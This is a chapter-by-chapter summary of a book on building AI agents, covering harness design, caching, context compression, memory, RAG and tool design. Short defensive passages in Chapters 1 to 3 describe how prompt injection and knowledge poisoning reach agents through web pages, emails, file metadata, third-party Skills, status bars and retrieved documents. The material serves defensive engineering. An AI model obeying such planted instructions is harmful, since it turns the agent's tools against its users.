> Source: https://github.com/bojieli/ai-agent-book · English text: https://github.com/bojieli/ai-agent-book/tree/main/book-en · Read online: https://bojieli.github.io/ai-agent-book/

## Core formula

- **Agent = LLM + Context + Tools**, equivalently **Reasoning Engine + Working Context + Action Interfaces**. The plus signs are engineering composition, not an RL definition, and the formula covers only what is inside the Agent boundary. The Environment is the other side of a closed loop, not a component.
- Production form of the same system: **Agent = Model + Harness**, where **Harness = context management + tool interfaces + Constrain + Verify + Correct**. The Harness is the runtime and governance layer inside the Agent boundary and outside the Model. Tool definitions, adapters, sandbox permissions are Harness; files inside the sandbox, databases, web pages, users, the physical world are Environment.
- Loose RL mapping: LLM ~ policy, context ~ observations and history, tools ~ observation/action interfaces.
- **Observation space and action space are the interface between model and world.** Information outside the observation space does not exist for the model; an action outside the action space is something it can only recommend in words. With the model held constant, the primary systems lever is redefining or expanding those two spaces, that is, expanding context and tools. Many problems that look like they need a smarter model are interface problems.
- Product evidence: Manus unified the previously separate Deep Research, Coding, and Computer Use tracks by taking the union of their observation and action spaces. OpenClaw pushes further by living in the user's messaging channels and local file system.

## Chapter 1: Agent fundamentals

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter1.md

**Five context components** of every LLM call:
1. System prompt (developer-written, fixed; carries cross-session user memory and injected environment state)
2. Tool definitions (names, descriptions, parameter schemas)
3. User messages (may carry RAG-retrieved knowledge)
4. Assistant messages (`reasoning` + `content` + `tool_calls`, rarely all three at once)
5. Tool results

Items 1-2 are the **static prefix**; items 3-5 are the **trajectory**. So **context = static prefix + trajectory**.

**Ablation finding (Exp 1-1).** Components are not equally important. Removing tool definitions removes the ability to act, but the Agent does not go silent: it returns a confident, well-formatted answer sourced from parametric memory and shaped exactly like a real one. Removing tool results makes it execute blind and retry until the iteration budget runs out. Removing the reasoning trace costs little when the reasoning is reconstructible from tool results. The test for any component is whether its information can be reconstructed elsewhere. Engineering lesson: **"produced an answer" is not "completed the task"** - the typical failure under missing context is a flawless-looking answer, not an error.

**ReAct loop.** reason -> act -> observe, repeat, appending to the trajectory each time. Exit on a final-answer tool, a response with no tool calls, an error, or a round cap. Autonomous Agents need explicit stopping conditions or they loop or keep working past completion.

**Five tool categories** (detail in Ch4): perception, execution, collaboration, event triggers (the Agent never calls these; they arrive and activate it), user communication.

**Tool design principle.** Use general-purpose foundational capabilities for composition and exploration; use specialized tools to constrain high-risk operations and enforce business rules. Start with the narrowest capability the task needs. A constrained Python interpreter beats an ever-growing pile of specialized tools once the task branches, but generality expands the attack surface: isolated sandbox, network off by default, no paths outside the working directory, limits on time, CPU, memory, output size. Payments, deletion, sending email, and production deploys stay as dedicated tools with explicit parameters and audit trails.

**Harness engineering.**
- The word comes from horse tack: not to limit power, but to direct it.
- The stronger the model, the more the Harness matters, because greater decision authority makes each wrong decision costlier.
- On the Bitter Lesson: endorse the direction, stay pragmatic about the pace. Models will keep absorbing Harness layers (tool calling and long-horizon planning already were), but training runs on a timescale of months and no model internalizes a specific business's constraints in one pass. **The model's current capability boundary is exactly where the Harness creates value.**
- In Claude Code, most Harness code is Constrain/Verify/Correct, not Context/Tools: process state tracking, multi-layer context compression, permission classification, circuit breaking, error recovery and rollback.
- Evidence that the Harness is the lever: LangChain went from 52.8% to 66.5% on Terminal Bench 2.0 with no model change, by having the Agent check its own execution results, detect repetition loops, and refine strategy.

**Engineering paradigm ladder,** each nested inside the next: Prompt Engineering -> Context Engineering -> Harness Engineering -> Loop Engineering (sustained autonomous operation across runs: who finds the next work item, when to verify, when it is truly done) -> Graph Engineering (nodes as capabilities, typed edges as routing, checkpointed state; the practice predates the July 2026 label and matches LangGraph, Microsoft Agent Framework, Google ADK).

**Three principles** (from Anthropic's experience): keep it simple (direct API calls over frameworks; every abstraction is a debugging blind spot), keep it transparent (show plans, logs, trajectory), and design the ACI (Agent-Computer Interface) from the Agent's perspective, applying Poka-yoke - make misuse physically impossible rather than documenting against it.

**Three levels at which an Agent changes**, ordered by persistence and by reversibility:
1. Contextual adaptation, within a task, instant and cheap, bounded by the window (Ch2)
2. External artifacts across tasks: knowledge documents, prompts, Skills, programs, Harness code - auditable and revisable (Ch3-5, Ch9)
3. Parameter updates via post-training, for high-dimensional capabilities that rules cannot express (Ch8)

**Workflow vs autonomous.**
- Workflow: predefined code paths, deterministic. Advantages are strict process control (no booking before payment, enforced by code) and a smaller attack surface, since injection can only affect the current node. Limitation is rigidity under unanticipated events.
- Autonomous: path decided at runtime from environmental feedback. Suits open-ended tasks where step count is unpredictable. Costs more and compounds errors.
- Order of escalation: single LLM call -> workflow -> autonomous Agent. Introduce an Agent system only when dynamic decisions are genuinely required; Agent systems trade latency and cost for task performance.
- **A more complex Harness is not a better Harness.** Manus states it as "Less structure, more intelligence." A complex workflow has fixed topology, so each new exception adds a node and the architecture grows less general while growing bigger. Hard-code only boundaries that must always hold (permissions, never overwrite source, atomic publication) and return the rest of the decision space to the model. Promote a step into a dedicated verifier or deterministic process only when a business constraint requires it or evaluations show a stable failure mode.
- Mixed patterns are normal: compliance-critical paths as workflows, flexible parts autonomous. Another mix is having the autonomous Agent write the orchestration code first, then execute it deterministically (Ch10).
- **Adapter layers get internalized.** Harness code that patches a model or tool shortcoming disappears as models improve: few-shot examples and "think step by step" were absorbed by instruction tuning and reasoning models; JSON repair by structured output and native tool calling; text-to-image prompt rewriting by native multimodal generation.

**Model selection.** Evaluate on your own tasks, not leaderboards (Ch7). Open-source lags closed-source by under six months at far lower cost. Most Agents need a reasoning model; the exceptions are single-step tasks and fixed-position GUI clicking. Two overlooked axes: output token speed (rounds are serial, so 2 s per round times 20 rounds is 40 s of added latency) and multimodal support. Also check **policy boundaries**: a model may be technically able but contractually or product-blocked for a task, and the same request can behave differently in a chat product, a Coding Agent, and the API. Keep a human handoff or an alternate compliant model as fallback.

**Guardrails, layered by how hard they are to bypass** (this taxonomy recurs throughout the book):
- **Context layer** - what the model gets to see: relevance classifier, safety classifier (jailbreak = user bypassing the model's own limits; prompt injection = attacker acting through external data), content moderation, rule-based filters, source labelling, instruction/data separation. Structural ceiling: **an Agent inside the attacked context can hardly tell it has been injected**, so this layer lowers success rates but guarantees nothing.
- **Execution layer** - what the model gets to do: tool risk rating by reversibility, privilege, and financial impact; high-risk actions need review by a mechanism *outside the context* (independent process, least-privilege credentials, sandbox, human), or it falls with the injected Agent. Replies count as actions, so PII filtering and output validation sit here.
- **Data layer** - what the world can be changed into: row-level security, constraints, validators, controlled views and stored procedures, unforgeable access context. Its value is that it does not depend on the layers above being correct (Ch5).
- Guardrails also fail by **false refusal**: evaluate that permitted work still completes, not only that prohibited work is blocked.
- Human-in-the-loop triggers: exceeding retry/operation caps, and high-risk or irreversible operations.

**Five design patterns used across the whole book:**
1. **Proposer-Reviewer** - production and judgment in two roles with separate contexts; the reviewer sees the artifact (rendered output, test results, structured call arguments), not the producer's reasoning. Premise: **self-review is unreliable**; a model cannot think of what it failed to think of, nor tell that it has been injected.
2. **Progressive Disclosure** - searchable catalogue first, details loaded on demand. Optimizes context budget and selection accuracy at once. Archetype is Agent Skills (Ch2); variants are layered retrieval (Ch3), proactive tool discovery and paginated truncation (Ch4), Agent discovery (Ch10).
3. **Append-only** - state grows by appending, never revised in place. Buys cacheability, replayability, auditability. Its performance form is KV-cache prefix stability: the earlier a change lands, the more cache it invalidates.
4. **Boundary Set + Retention Set** - validate every change both on samples it should change and on samples it must not affect. Testing only the first mistakes overfitting for progress; only the second mistakes an inert change for a safe one.
5. **Minimal Diff, Reversible** - small changes carrying provenance, independently revertible, so failures are attributable.

## Chapter 2: Context engineering

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter2.md

**Premise.** Context is the ceiling on Agent capability; a moderate model with well-organized context beats a stronger model with insufficient context. Context engineering is also an organizational problem: if architectural decisions live in senior engineers' heads and chat logs, the Agent inherits that poverty. Teams that work well remotely (public discussion, recorded decisions, documentation-driven, like the Linux kernel) are already AI-friendly environments. Treat the Agent as a new team member at the start of every task.

**API structure.** Four message roles (`system`, `user`, `assistant`, `tool`, the last linked by `tool_call_id`) plus a top-level `tools` field cover exactly Chapter 1's five components. APIs are stateless, so the framework must rebuild sufficient context every call; a central responsibility of an Agent framework is maintaining the message list. The model issues call requests, the framework executes them. Independent calls can be issued in one response and run in parallel; dependent ones need another round.

### KV cache

Three rules that survive skipping the theory:
1. **Once the system prompt and tool definitions are set, do not change them.** Any edit, even one space, breaks reuse from the first differing token onward. The earlier the change, the more expensive.
2. **Append dynamic information at the end** as new messages; never edit timestamps or user state into the system prompt.
3. **Use the standard API message format.** Manual `"USER: ... ASSISTANT: ..."` concatenation departs from the training format and weakens multi-step reasoning. (Caching itself only depends on byte stability, so a stable hand-built prefix can still cache - the reasoning damage is the real cost.)

- Canonical incident: adding `Current time: {{now}}` to a system prompt took TTFT from 0.5 s to 3-5 s and nearly doubled the monthly bill.
- **KV Cache vs Prompt Cache.** KV Cache is inside the model, within one inference pass. Prompt Cache is an inference-engine/provider optimization reusing identical prefixes across requests. Cache reads cost roughly one tenth of fresh computation at Anthropic, DeepSeek, GPT-5.
- **Chat Template** converts JSON messages into the token stream with special tokens (`<|im_start|>`, `<|im_end|>`). It explains both why the standard format matters and why the prefix is cache-sensitive. Mislabeling a tool result as a user message can trigger the template's "user changed subject" reset and clear retained reasoning mid-task.
- **Historical reasoning policy differs sharply by vendor and is still moving.** DeepSeek R1 said strip all historical `reasoning_content`; DeepSeek V4 reversed it - if the request carries `tools`, every assistant message's `reasoning_content` between two user messages must be passed back verbatim or the API returns 400. Kimi K2 and GLM-5 adopted the same protocol. Claude requires thinking blocks passed back unchanged with signature verification inside the tool loop, and ignores them from before the latest user input. In multi-turn chat this only costs tokens; handing a half-finished trajectory to a different vendor's model turns it into hard errors.
- **Anti-patterns measured in Exp 2-3:** dynamic system prompt; dynamic user config in the prefix; reordering tool definitions by usage frequency (fixed order costs almost nothing in selection accuracy and gains a lot in performance); sliding-window history (breaks the prefix *and* drops tool results still needed later, producing loops where the Agent re-runs the same calls); flattening messages to text.
- **Cache economics is an architectural constraint, not a post-hoc optimization.** In Claude Code the system prompt is split by a cache-boundary marker: everything before it is globally cacheable, everything runtime-dependent goes after. Each binary runtime condition placed before the boundary doubles the cache-key variants (N conditions -> 2^N). Sub-agents inheriting parent context must be byte-aligned with the parent (prompt, tools, model config, message prefix, reasoning config). Replacement strings for truncated tool results are frozen on first use so restored sessions stay byte-identical.
- Appending a discovered tool schema mid-trajectory does not break the cache, because causal attention means new tokens cannot change earlier K/V. The schema is appended once and stays where it landed; it is not moved to the end each turn.
- Research direction (not production guidance): during prefill the model writes downstream "notes" about what a field *means*, and the field's own KV states can contribute under 1% of the decision. That opens editable and RoPE-relocatable, composable caches, turning O(L^2) recomputation into O(L) splicing.

### Prompt engineering

- Litmus test: if a capable new team member could not act after reading your system prompt, neither can the Agent.
- Structure with both XML and Markdown: XML tags carry machine-parseable semantics (`<working_directory>` beats "Current directory: ..."), Markdown headings carry human-readable hierarchy.
- Prefer a process-driven SOP over a stack of rules. **Exp 2-4 (Tau-Bench ablation): removing hierarchy and ordering while keeping all rule content dropped task success by over 30%** and caused rule violations like refunding before identity verification. Removing tool descriptions while keeping signatures raised tool-call error rate 45%. Tone and style changed wording a lot but task completion little.
- Uppercase "NEVER do X" raises salience over "please avoid", but overuse dilutes it.
- **Business rule refinement is a product-design job, not an engineering one.** Vague rules ("choose the appropriate billing type") make behavior unstable: is cancelling Netflix "saving money"? Rules must be executable to the point of naming the disallowed case ("NEVER use percentage_based_one_time for refunds and cancellations"), fixing the estimation procedure, and defining billing granularity. In mature teams product managers write the prompts and engineers encode them.
- Few-shot examples are for outputs that rules cannot describe precisely (style, tone, report format). Two or three examples covering boundary cases beat ten near-duplicates, which dilute attention. Keep the example set fixed per task type; retrieving a different "most relevant" example per request destroys prefix stability.
- Tool definitions are becoming progressively disclosed natively: OpenAI Responses API `tool_search` plus `defer_loading: true`, Anthropic `tool_reference` blocks, Claude Code deferring MCP tools to names only, Codex CLI BM25 `tool_search`. Requires models trained on mid-conversation tool definitions (GPT-5.4+, Claude 4.5+).

### Prompt injection

- Definition: attacker plants text disguised as instructions inside content the Agent processes (web page, email, PDF metadata, image EXIF). Worse than for a chatbot because the Agent has tools and can take irreversible actions. **Every perception tool is an injection entry point**, so the attack surface grows with capability.
- Context-layer defenses: source tagging (`<external_content source="webpage">`), strict use of the role system (another reason not to hand-concatenate), input sanitization (weakest, easily reworded around).
- Skills and status bars create new injection surfaces: a Skill formalizes loading external content *as instructions*, so third-party Skills need review like executable code, and status-bar poisoning exploits the model's near-unconditional trust in status content.
- These are only the first line. Execution and data layers (Ch4, Ch5) are what actually hold.

### Agent Skills (progressive disclosure)

- Three layers: (1) `SKILL.md` YAML frontmatter with `name` + `description`, always discoverable; (2) full `SKILL.md` body loaded when selected; (3) referenced sub-documents read selectively.
- **Write the `description` as a routing condition, not a feature summary.** Include "Use when" / "Do not use when" and negative examples. "Help with backend" fires on everything.
- Two activation paths: an explicit slash command the client expands locally (no extra round trip), or model-driven selection via a Skill tool (costs one ReAct round trip; the tool result is only a placeholder and the body arrives as a user message at the invocation point).
- Content recipe: role and reader; three to five core principles with positive and negative examples; prohibitions including legitimate exceptions; references. Prefer "scope + action + exception + verification" over a growing forbidden-word list. Build a writing Skill by having the Agent infer patterns from three to five of your own pieces, then folding your sentence-level edits back in - the diffs teach more than "make it more natural."
- Skills can bundle executable scripts and templates. They turn capability expansion from central prompt editing into a package-manager-like ecosystem.
- Design principle that outlives any harness: **a small catalogue kept discoverable, the full body loaded on demand.** KV-cache-friendly does not mean free; the body costs once on first load.
- General principle: **align your interaction mode with the model vendor's training methodology.** Patterns vendors promote are usually patterns their models were trained for.

### Agent status bar

- Mechanism: the framework injects structured meta-information at the *end* of the context, as a `user`-role message wrapped in `<agent_status>` tags. The `user` role here is a protocol slot borrowed by the Harness, not end-user input.
- **Theoretical basis: in-context learning is retrieval-like, not reasoning-like.** Attention finds existing tokens well but does not automatically count, index, or aggregate in one forward pass. "How many times have I called?" stays scattered across raw records and must be recomputed every decision, at a cost that grows with context.
- Contents: task planning / TODO list; per-event side-channel metadata (precise time, location, interval since last reply); environment observation summary (system time, working directory, OS, repeated-call warnings).
- Measured effects: a precomputed status bar brings small open models near frontier accuracy on constraint-following, and cuts reasoning tokens, latency, and cost per iteration by roughly an order of magnitude - reasoning per query goes from growing with context to roughly constant. TODO support cut average iterations from 21 to 15. Detailed four-layer error information (type, full parameter JSON, stack, targeted fix suggestion) raised error-recovery success from 60% to 95%.
- Two update implementations. **Replace each round**: delete the old status, append the new one; invalidates only the suffix since the last injection. **Persistent appending** (Claude Code `<system-reminder>`): never delete, fully cache-friendly, but stale statuses accumulate. Rough break-even with status size S, tokens added between updates R, update count N, cached-input price ratio alpha: prefer appending when alpha*S*N/2 < (1-alpha)*R.
- Two cautions: **maintain the status bar with code**, and if an LLM must be involved, extract items one at a time and aggregate in code - never ask for a batch count, because models trust the bar unconditionally and are bad at counting. And **do not delete the original context**: a status bar is a lossy projection that precomputes only the dimensions you anticipated; one question outside them and accuracy collapses.

### Compression

Three motivations: length and cost; **reasoning quality** (a distilled "Known so far: ..." is more usable than a dozen raw search dumps); and **context anxiety** (a model that believes it is running out of window starts wrapping up early, so compressing well before the limit can improve decisions).

- **Context rot** is distinct from overflow: overflow is "cannot fit", rot is "it fits but cannot be found". Rot is more insidious because the Agent looks fine while decision quality degrades.
- Status bar *adds* computed conclusions; compression *replaces* raw records with them. Same missing distillation layer, two directions. Status bars are usually maintained by code, compression by an LLM call.
- Compression happens between API calls, never inside one. It invalidates cache only after the replacement point, so **compress in batches near a threshold rather than every round**.
- **Exp 2-10, six strategies on a research task (Kimi K3, budget capped at 128K):** no compression fails at iteration 5 (~367K characters from 7 calls); per-result summarization works but fragments information (12 iterations, 277K tokens); combined summarization (10 iterations, 93K); **context-aware compression, which feeds the current query intent and accumulated context into the compression prompt, is the winner at 7 iterations and 40K tokens, ~3% compression ratio** (one case: 150K characters to 2K with the needed facts intact); adding citations keeps a lossless index back to sources; adaptive windowing compresses only above ~80% window use, keeping early information intact at higher total token cost.
- **Production hierarchical compression (Claude Code shape), matched to information lifetime:** (1) tool-result budget control - large outputs to disk, model sees a preview, replacement frozen; (2) delete noise outright instead of summarizing it; (3) API-level context editing to drop specific tool results server-side, worth it only when the cache rebuild is already unavoidable; (4) archival summarization round by round, like `git log` rather than a squash; (5) full LLM compression as last resort, two-staged, with a circuit breaker because production sessions get stuck in repeated compression-failure loops.
- Four design principles: information value is non-uniform; preserve semantic integrity ("Sutskever left" is not a valid compression of "Sutskever left OpenAI in May 2024"); compression is task-relative; compression is understanding, and its output is reviewable and reusable across sessions.
- **What compression loses first: early architectural decisions, the reasons behind constraints, and failed paths.** Countermeasure: have the Agent save progress to documents rather than leaving everything in the execution history. If the model lacks the habit, install it via prompt or Skill.
- **Isolation beats compression.** Delegate context-heavy exploration to a sub-agent; the main context gains two messages (task description, conclusion) while tens of thousands of tokens die with the sub-agent's context. Compression is a lossy post-hoc remedy that costs an LLM call and breaks cache; isolation keeps noise out from the start and leaves the main prefix untouched. Cost: the sub-agent cannot see the parent context, so the task description must be self-contained.

## Chapter 3: User memory and knowledge bases

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter3.md

User memory (per individual) and knowledge base (shared) are the same problem at two scales, sharing the same machinery (vector retrieval, compression) and the same failure modes (conflicting information, staleness, imprecise retrieval).

### Memory system design

Three orthogonal dimensions: **where** (trajectory / user long-term memory / business state), **how** (four storage formats), **what** (cognitive type).

- **Trajectory vs long-term memory:** the trajectory is an append-only log of one session, never rewritten; long-term memory is an archive, repeatedly rewritten, merged, pruned. Working memory is a filtered, activated *subset*; a trajectory is the immutable full sequence.
- **Extraction rules:** selectivity (drop "the search returned 3 options"), abstraction (one window seat becomes a lasting preference), structure (retrievable fields).
- **Three-level capability framework** used to evaluate memory throughout the chapter: (1) **basic recall** of directly stated, unambiguous facts; (2) **multi-session retrieval** across entities, channels, and time - two cars means asking which one, a "trip" is a composite event linking flights and hotels; (3) **proactive service** - connecting a newly booked international flight to a passport stored months ago that is about to expire. Level 3 is the real test of assistant-level capability.
- **Four storage formats,** increasing granularity and structure: **Simple Notes** (one atomic fact each; O(1), but severs associations); **Enhanced Notes** (paragraph with full context; rich but redundant and hard to update); **JSON Cards** (category -> subcategory -> key-value, supports partial update, but forces single-category classification); **Advanced JSON Cards** (adds `backstory`, `person`, `relationship`, timestamp - solves disambiguation, e.g. your dentist Dr. Zhang vs your father's cardiologist Dr. Zhang). Practical rule: Advanced JSON Cards for **critical low-volume** data, Simple Notes for **bulk non-critical** facts; most production systems are hybrids.
- **User as Code:** represent user state as typed executable objects with rules as ordinary functions, so representation and reasoning share one verifiable medium. Uses write-ahead log plus checkpoint: facts append to a log, typed state rebuilt periodically. Hands aggregation, conflict detection (medications vs allergy history), and constraint enforcement (passport validity on every state update) to deterministic code instead of LLM mental arithmetic.
- **Cognitive types:** episodic (a specific booked flight), semantic (the user is vegetarian), procedural (the user's habitual booking sequence). Orthogonal to storage format.
- **Compression tiers:** importance scoring (access frequency, time decay, emotional intensity, uniqueness) -> clustering similar memories into representative summaries -> abstracting episodic memories into semantic or procedural rules.
- **Framework case studies.** Mem0 v2 resolved conflicts at *write* time (extract facts, vector-search neighbors, then ADD/UPDATE/DELETE/NOOP), which kept the store consistent but could irreversibly discard history on a wrong update. Mem0 v3 (2026) moved conflict resolution to *retrieval*: append-only ADD, "lives in Beijing" and "moved to Shanghai" coexist as dated facts, and query time fuses semantic similarity, BM25, entity matching, and temporal ranking. Reported LoCoMo 71.4 -> 92.5 and LongMemEval 67.8 -> 94.4; the external graph store was dropped, so Mem0-g is historical. Memobase instead fixes the shape: configurable user-profile slots plus timeline event memory, with buffered batch extraction to amortize LLM cost and keep query latency low.
- Privacy: sanitize logs for PII with a **local** small model (Qwen3 0.6B via Ollama) - sending logs to a cloud API for sanitization defeats the purpose. LLM sanitization reports over 95% recall with fewer false positives than regexes; hybrid regex-then-LLM for high throughput.

### RAG pipeline

Chunking -> dense and sparse retrieval -> fusion -> reranking -> generation, measured by recall@k, MRR, nDCG.

- **Chunking** is needed because embedding inputs are bounded and a whole-document vector mixes topics until it represents none of them. Strategies: fixed-size with 10-20% overlap; recursive/structure-aware along headings and paragraphs (the common production default); semantic chunking at similarity cliffs. Practical starting point: 256-1024 tokens, 10-20% overlap, then tune on measured retrieval quality. Every strategy severs the chunk from its original context, which is what Contextual Retrieval later repairs.
- **Dense embeddings** map text to vectors compared by cosine similarity (angle, not magnitude, so length does not distort similarity). Static Word2Vec cannot handle polysemy; context-aware models (BERT, BGE-M3) give the same word different vectors per context.
- **Sparse embeddings / BM25**: TF-IDF weights terms that are frequent here and rare in the corpus; BM25 adds term-frequency saturation (k1) and document-length normalization (b), and uses a smoothed IDF that can go negative for terms in over half the corpus, so implementations clamp it. Strong on identifiers and proper names, blind to synonyms.
- **Hybrid retrieval** in three stages: parallel retrieval; **fusion**, usually Reciprocal Rank Fusion, score = sum of 1/(k + rank) with k around 60, which discards incomparable score scales at the cost of discarding score information; then **neural reranking**. Reranking does not replace fusion - fusion builds the candidate pool, reranking reorders within it. Retrieval uses a **bi-encoder** (encode separately, compare vectors: fast, shallow); the reranker uses a **cross-encoder** (concatenate query and document, compare word by word: slow, accurate). Recruiter skimming resumes vs interviewer in conversation.
- Note on definitions: the book's "recall@k" is really hit rate / success@k (at least one relevant document in the top k), matching Anthropic's reporting convention, not the academic recall@k.

### Why naive RAG is not enough

Two cases that indexing-time work fixes and larger k does not:
- **Counting.** 100 case documents, 90 black cats and 10 white. Ask for the ratio and top-k retrieval returns a biased sample. Pre-generating and indexing the summary "90 black (90%), 10 white (10%)" makes one retrieval exact.
- **Boundaries.** Hundreds of support tickets each state one individual outcome; none states the eligibility rule. A nurse asking "am I eligible?" hits three obstacles at once: **nearest-neighbor bias** ("nurse" is closest to "doctor", so whichever ticket ranks first decides the answer), **missing boundary semantics** (a universal "only ..., all others do not qualify" exists in no single ticket, so no k recovers it), and **missing completeness signals** (the model cannot tell it has not seen everything, so it answers confidently). Fix: distill one rule card offline.
- General principle: **the attention mechanism is similarity-based soft retrieval, not a thinking engine that summarizes and builds hierarchies.** So spend compute at indexing time to extract, abstract, and structure.

### Structured indexing and organization

- **RAPTOR**: bottom-up recursive abstraction - chunk, cluster, LLM-summarize each cluster into a parent, recurse. Gives retrieval at any level of abstraction. Suits "drill down from a concept to details".
- **GraphRAG**: entity-relationship triples plus community detection. Two irreplaceable strengths: **multi-hop reasoning** along relationship chains (user -> doctor -> hospital -> address) and **entity disambiguation** (two real Dr. Zhangs as distinct nodes - different from word-sense disambiguation, which context-aware embeddings already handle). Weakness as general memory: triples lose conditional logic and temporal dependency ("if it rains next week I'll cancel the beach trip" degrades to two isolated facts), and bad extraction poisons the store.
- Recommended layering: keep core information in complete natural language, add structured metadata for indexing, and use knowledge graphs as a specialized index only where multi-hop and disambiguation matter (medicine, law, family relations).
- **When structured indexing is worth it:** if queries are "find the fragment containing this", hybrid retrieval suffices. If they need cross-document synthesis or multi-level navigation, pay the extra LLM cost at both index and query time.
- **Filesystem paradigm (OpenViking, ByteDance).** Map memories, resources, and skills into a virtual filesystem under `viking://` URIs, with **L0/L1/L2 on-demand loading**: L0 ~100-token summary for relevance triage, L1 ~2000-token overview for planning, L2 full text on demand. Each directory carries `.abstract` and `.overview`. Same shape as Skills progressive disclosure. Markdown plain text is chosen over a database deliberately: users can read and correct it, Git gives version control and rollback, and the Agent can write on a branch and merge through review.
- **A flat pile of Markdown files does not retrieve.** Beyond vertical summaries you need horizontal links: organize like Wikipedia, entry pages plus index pages, linking whenever one entry mentions another - lightweight file links buying part of GraphRAG's navigation. **Models differ in whether they maintain links spontaneously**; weaker ones just append isolated files, so the knowledge-writing prompt must require retrieving and linking existing entries and updating the directory index.

### How knowledge gets updated

- **Treat the knowledge base like a codebase and every change like a PR.** Applies to Markdown knowledge bases, memory files, and rule documents, not only executable memory. Everything in Git, with diff review, history, accountability, rollback. No model modifies the main branch or the live index directly.
- **Proposer-Reviewer loop:** Proposer retrieves existing knowledge first, then proposes the smallest complete diff on a branch, maintaining links, indexes, temporal metadata, and evidence references. Reviewer independently audits prior knowledge + diff + **raw evidence** (trajectories, original conversations, tool outputs), checking for unsupported assertions, dropped qualifiers, cross-file conflicts, and over-broad deletions, and returns feedback tied to specific evidence and lines. Iterate to convergence under a max iteration or cost budget, then escalate to a human rather than passing by default. After merge, CI checks formatting, links, metadata, permission labels (plus types and tests if knowledge is code), and only then rebuilds indexes incrementally.
- **Three separated layers:** raw-evidence (append-only), knowledge (distilled, maintainable), serving (indexes derived from a merged version). Git is the source of truth; the index is a reproducible derivative. Every PR records evidence IDs, base version, review comments, decision, so any production fact can answer "from which evidence, approved by whom, when?"
- **Both roles must be Agents, not two LLM calls** - they need search, version comparison, test execution, and evidence retrieval, and both need access to the complete authorized knowledge base and evidence store, not just fragments the upstream step selected.
- **Use similar-capability models from different families** (Claude proposes, GPT reviews; DeepSeek proposes, Kimi reviews). Different training data and habits reduce correlated errors; similar capability keeps the reviewer from falling behind. Enforce separation of duties in permissions: Proposer writes only to a branch, Reviewer only reads and reports, only the merge workflow touches main and the index.
- **Periodic full reorganization** complements incremental updates, which each see only a local area. Three tasks: deduplicate/retire/merge and rebuild links and indexes; **return to raw data for verification** (rewriting from summaries propagates early omissions generation after generation - batch by directory or topic but keep a coverage checklist so batching does not become sampling); and resolve conflicts by tracing sources and qualifying scope rather than keeping the newest, preserving and flagging genuine conflicts when evidence is insufficient. Reorganization output also goes through Proposer-Reviewer, and after merging, replay representative retrieval and QA cases to confirm the new structure did not hide previously findable knowledge. Trigger on a schedule or on thresholds for new entries, conflicts, or retrieval-quality decay.
- Attach version numbers and effective/expiry dates so superseded policies are filtered or explicitly marked deprecated at retrieval.
- **Permission filtering must happen in the retrieval layer.** Once sensitive content is in the context, you cannot guarantee it stays out of the answer. Multi-tenant systems isolate vector indexes and metadata too.

### Agentic RAG

- Retrieval becomes a tool the Agent calls inside a ReAct loop, instead of a fixed pre-step. Traditional RAG is one library search before you must write the report; Agentic RAG is a researcher returning to different shelves and cross-checking.
- **Exp 3-8 (Chinese judicial QA):** on simple questions non-agentic RAG matches agentic quality and is faster. On compound questions (intoxicated negligent injury with a prior theft conviction) non-agentic retrieval misses the linking information and produces factual errors, while agentic RAG decomposes into parallel sub-queries, notices the missing link between them, issues a focused second round, and synthesizes. Value is in solving problems, not answering questions.
- **RAG security:** retrieved documents are the archetypal indirect prompt injection vector, and knowledge poisoning is the same attack moved before indexing. Two defenses: instruction-data separation with source marking, and never letting retrieved content directly trigger high-risk actions - retrieved text may shape wording, but transfers, deletions, and outbound messages need independent authorization.

### Contextual Retrieval and the two-tier architecture

- **Contextual Retrieval** (Anthropic): before indexing a chunk, have an LLM generate a short prefix summary anchoring it ("[from the Key Performance Indicators section of ACME Corp's 2025 Q2 report]"), then index prefix + chunk. Helps both modes at once: exact keywords for BM25, correct semantic background for the embedding. Cost is controllable with prompt caching, roughly $1 per million document tokens. **Reported: 49% reduction in retrieval failure rate combined with BM25, 67% with a reranker.**
- Not to be confused with Chapter 2's contextual compression: Contextual Retrieval is indexing-time, on knowledge chunks, **additive**; compression is runtime, on conversation history, **subtractive**.
- Applied to user memory, prefixes turn contradictory conversation chunks into resolvable ones: `[Wife setting up the initial wire transfer]`, `[Husband modifying it]`, `[Wife modifying it again after the husband's change]` supply the time, person, and intent needed to determine what is currently valid.
- **The two-tier memory architecture is the chapter's convergence point.** Advanced JSON Cards keep a small number of key facts resident in context as an always-visible overview; Contextual Retrieval fetches details on demand from raw conversations. Resident context alone loses details to capacity; retrieval alone misses cross-session connections for want of a global view. Only the combination makes Level 3 proactive service engineeringly feasible.

### Knowledge discovery from structured datasets

Where knowledge is implicit in a mass of structured cases (judicial precedents, clinical records), retrieval is not enough. Two phases: (1) LLM-extract each case into a standardized JSON object, with the schema itself discovered bottom-up by having the LLM freely list influential factors across sample cases, split into a core schema plus per-category extended schemas; (2) encode categorical fields as one-hot (not 1/2/3, whose magnitude implies false ordering), cluster to find case prototypes, and build a factor-importance hierarchy. The Agent then uses that hierarchy to ask guiding questions in order of importance and answers from the matching prototype's statistics rather than a black-box prediction.

**Multimodal memory (frontier).** Three approaches: store raw media plus a text description and index the text; store the **embedding** in a dedicated context region, where one face or voiceprint costs about one token so 1000 tokens holds 1000 faces; or write facts into model parameters. Note on the third: per-user fact-LoRAs recite facts well but fail at indirect reasoning over them, because the frozen backbone never learned to consult a temporarily attached adapter - **storing a fact and teaching the model when to use it are different problems**. User as Engram writes embeddings into unused hash N-gram slots of an Engram-pretrained model instead, gaining scale at some cost in precision.

## Chapter 4: Tools

https://github.com/bojieli/ai-agent-book/blob/main/book-en/chapter4.md

Five categories by invocation direction and target: **perception** (Agent calls, acquires information), **execution** (Agent calls, changes the world), **collaboration** (Agent calls, drives other Agents or humans), **user communication** (Agent calls, conveys to the user), **event-triggered** (Agent registers, the outside world triggers). The last two need an event-driven runtime and are deferred to Ch6.

### Universal design principles

**ACI (Agent-Computer Interface)** by analogy with HCI: **a tool should correspond to the Agent's goal, not to an underlying API operation.** The earliest and worst pattern is one tool per API endpoint.

**Form of capability expression** is a spectrum from dedicated tools (structured, deterministic, schema-constrained, but hundreds of tokens resident each) to Skills (natural-language workflow the Agent runs via bash or a code interpreter; a few dozen tokens in the catalogue, body read on demand).
- **Default: prefer general tools** unless there is a clear security, permission, or performance reason. Give a `code_interpreter` with SymPy/NumPy/pandas rather than a calculator. The LLM already has reasoning and code generation; a general tool hands it a meta-capability that also covers the edge cases nobody anticipated.
